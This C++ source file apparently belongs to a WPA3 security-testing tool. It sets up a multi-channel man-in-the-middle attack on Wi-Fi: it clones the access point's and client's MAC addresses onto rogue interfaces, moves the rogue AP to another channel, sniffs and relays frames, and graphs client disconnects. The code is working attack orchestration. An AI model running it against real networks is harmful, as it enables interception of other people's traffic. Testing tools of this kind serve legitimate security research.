
#include "attacks/by_target/scan_AP.h"
#include "attacks/components/setup_connections.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "config/RunStatus.h"
#include "logger/error_log.h"
#include "observer/tshark_wrapper.h"
#include "system/hw_capabilities.h"

using namespace std;
using namespace filesystem;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::mc_mitm{

    void setup_attack(RunStatus& rs){
        components::client_ap_attacker_setup(rs);

        const auto ap        = rs.get_actor("access_point");
        const auto rogue_client = rs.get_actor("rogue_client");
        const auto rogue_ap = rs.get_actor("rogue_ap");

        //TODO only for  2.4 GHz
        rogue_client->str_con["channel"] = ap["channel"];
        // rogue channel that doesn't overlap the real one - 1-11 are global valid channels //TODO check
        rogue_ap->str_con["channel"] = to_string((stoi(ap["channel"]) >= 6) ? 1 : 11);
    }
    void start_strict_tsharks(RunStatus& rs){
        const auto ap_mac = rs.get_actor("access_point")["mac"];
        const auto client_mac = rs.get_actor("client")["mac"];

        const string mac_filter =
        "(wlan host "+ ap_mac +" or wlan host "+client_mac+")";

        observer::start_tshark(rs, "rogue_ap", mac_filter);
        observer::start_tshark(rs, "rogue_client", mac_filter);
    }

    void run_attack(RunStatus& rs){
        const auto rogue_client = rs.get_actor("rogue_client");
        const auto rogue_ap = rs.get_actor("rogue_ap");
        const auto ap = rs.get_actor("access_point");
        const auto client = rs.get_actor("client");

        McMitm attack(
            rogue_client["iface"], rogue_ap["iface"],
            ap["ssid"],
            ap["mac"], client["mac"]);
        //attack.run();

        rogue_client->setup_mac_addr(client["mac"]);
        rogue_ap->setup_mac_addr(ap["mac"]);
        rogue_client->up_iface();
        rogue_ap->up_iface();

        start_strict_tsharks(rs);
        //rs.start_observers();

        attack.sender_real  = make_unique<PacketSender>(rogue_client["iface"]);
        attack.sender_rogue = make_unique<PacketSender>(rogue_ap["iface"]);

        string bpf = "(wlan addr1 " + ap["mac"] + ") or (wlan addr2 " + ap["mac"] + ")";
        bpf += " or (wlan addr1 " + client["mac"] + ") or (wlan addr2 " + client["mac"] + ")";
        bpf = "(wlan type data or wlan type mgt) and (" + bpf + ")";

        SnifferConfiguration sniff_cfg;
        sniff_cfg.set_filter(bpf);
        sniff_cfg.set_immediate_mode(true);
        sniff_cfg.set_timeout(100);
        // already in monitor modesniff_cfg.set_rfmon(true);

        //TODO move to actor:setup ?
        attack.sniffer_real  = make_unique<Sniffer>(rogue_client["iface"],  sniff_cfg);
        attack.sniffer_rogue = make_unique<Sniffer>(rogue_ap["iface"], sniff_cfg);

        attack_scan::ScanAP scan_ap{};
        scan_ap.bssid = ap["mac"];
        attack.beacon = RSN_scan(rogue_client["iface"], 10, scan_ap, path("/tmp/beacon.pcap"));
        if(attack.beacon == nullptr) throw runtime_error("beacon not found");

        log(LogLevel::INFO, "Giving rogue AP one second to initialize ...");
        this_thread::sleep_for(seconds(1));

        //TODO move to constrcutor
        attack.netconfig.real_channel = stoi(ap["channel"]);
        attack.netconfig.rogue_channel = stoi(rogue_ap["channel"]);
        attack.netconfig.ssid = ap["ssid"];
        attack.run(rs.config.at("attack_config").at("attack_time").get<int>());
    }

    void stats(const RunStatus& rs){
        vector<observer::graph_lines> events;
        events.push_back({get_time_logs(rs, "client", "CTRL-EVENT-STARTED-CHANNEL-SWITCH"),"SWITCH","blue"});
        events.push_back({get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED"),"DISCONN","red"});
        events.push_back({get_time_logs(rs, "client", "@START"),"START","black"});
        events.push_back({get_time_logs(rs, "client", "@END"),"END","black"});

        //observer::tshark_graph(rs, "client", events);
        observer::tshark_graph(rs, "rogue_ap", events);
    }
}
